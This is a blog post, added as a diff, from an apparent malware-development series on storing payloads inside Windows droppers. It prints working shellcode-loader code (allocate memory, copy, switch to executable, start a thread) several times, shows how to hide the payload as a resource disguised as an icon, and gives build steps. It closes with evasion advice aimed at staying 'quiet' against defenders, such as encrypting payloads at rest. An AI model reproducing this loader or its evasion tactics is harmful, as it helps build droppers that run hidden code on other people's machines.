@@ -1,0 +1,145 @@
+---
+title: "Payload storage patterns in Windows droppers"
+description: "Where to store payloads in a Windows dropper: .text, .data, and .rsrc, with the practical tradeoffs for detection and reliability."
+date: 2023-04-06
+tags: ["windows", "malware-dev", "dropper", "red-team", "windows-internals-series"]
+---
+
+Part 4 of the Windows internals series. In the first three posts I focused on loading and resolving APIs. This one starts one step earlier: where the payload lives before execution.
+
+A dropper has one core job: deliver payload bytes to memory and run them. The practical question is simple: where do you keep those bytes in the binary?
+
+The common options are:
+
+- `.text`: payload embedded as code-adjacent bytes
+- `.data`: payload embedded as initialized data
+- `.rsrc`: payload embedded as a resource object
+
+All three work. The right choice depends on how much static visibility you can tolerate.
+
+## Option 1: payload in `.text`
+
+The direct approach is storing the payload in a byte array in source and compiling it into the binary.
+
+```c
+unsigned char payload[] = { /* bytes */ };
+unsigned int payload_len = sizeof(payload);
+
+void *exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+RtlMoveMemory(exec_mem, payload, payload_len);
+VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+```
+
+Why people use it:
+
+- Minimal code
+- Easy to debug
+- No extra build steps
+
+Why it burns quickly:
+
+- Static scanners can see high-entropy byte blobs in the binary
+- The byte array is obvious in disassembly
+- Signature reuse gets easy across rebuilds
+
+I use this mostly for lab PoCs, not for anything pretending to be quiet.
+
+## Option 2: payload in `.data`
+
+This is the same technique with one layout change: declare payload as a global initialized variable so it lands in `.data`.
+
+```c
+unsigned char payload[] = { /* bytes */ };
+unsigned int payload_len = sizeof(payload);
+```
+
+Execution flow stays identical (`VirtualAlloc` -> copy -> `VirtualProtect` -> execute). The real difference is static layout, not runtime behavior.
+
+Practical effect:
+
+- Slightly cleaner separation between loader logic and payload bytes
+- Still easy for static tooling to extract
+- Similar detection surface to `.text` embedding
+
+If your loader is already doing obvious runtime memory permission changes, moving bytes from `.text` to `.data` does not magically make it stealthy.
+
+## Option 3: payload in `.rsrc`
+
+This is the one I prefer for better operator hygiene. You store payload bytes as a resource object, then extract at runtime.
+
+Resource declarations:
+
+```c
+// resources.h
+#define FAVICON_ICO 100
+```
+
+```rc
+// resources.rc
+#include "resources.h"
+FAVICON_ICO RCDATA "calc.ico"
+```
+
+Runtime extraction:
+
+```c
+HRSRC res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
+HGLOBAL resHandle = LoadResource(NULL, res);
+unsigned char *payload = (unsigned char *)LockResource(resHandle);
+unsigned int payload_len = SizeofResource(NULL, res);
+```
+
+Then the same execution stage:
+
+```c
+void *exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+RtlMoveMemory(exec_mem, payload, payload_len);
+VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+```
+
+Why `.rsrc` is useful:
+
+- Cleaner source code (no giant byte arrays in C/C++)
+- Payload separated from execution logic
+- Easier to swap payloads without touching loader code
+
+Limits:
+
+- Resource section inspection is standard in triage
+- If payload is raw shellcode, entropy still gives it away
+- You still expose the classic execution chain if you use RW -> RX + thread creation
+
+## Build flow for `.rsrc` payloads
+
+If you use resource-based storage, build has one extra stage:
+
+```bash
+rc resources.rc
+cvtres /MACHINE:x64 /OUT:resources.o resources.res
+```
+
+Then link `resources.o` with your main object files.
+
+This extra step is usually worth it because it keeps payload and loader concerns separated.
+
+## What actually matters operationally
+
+Storage choice matters less than post-storage behavior. Defenders mostly catch droppers on:
+
+- memory allocation patterns
+- memory permission transitions
+- thread creation into suspicious regions
+- parent-child process and command-line context
+
+So pick storage for maintainability first. Then spend effort on execution chain design.
+
+My default for this kind of tooling:
+
+1. Use `.rsrc` for payload organization
+2. Encrypt or encode payload bytes at rest
+3. Decode only when needed
+4. Keep decoded material alive for the shortest possible window
+
+Next part builds on this and looks at one specific carrier trick: appending payload bytes to image files and extracting by offset at runtime.
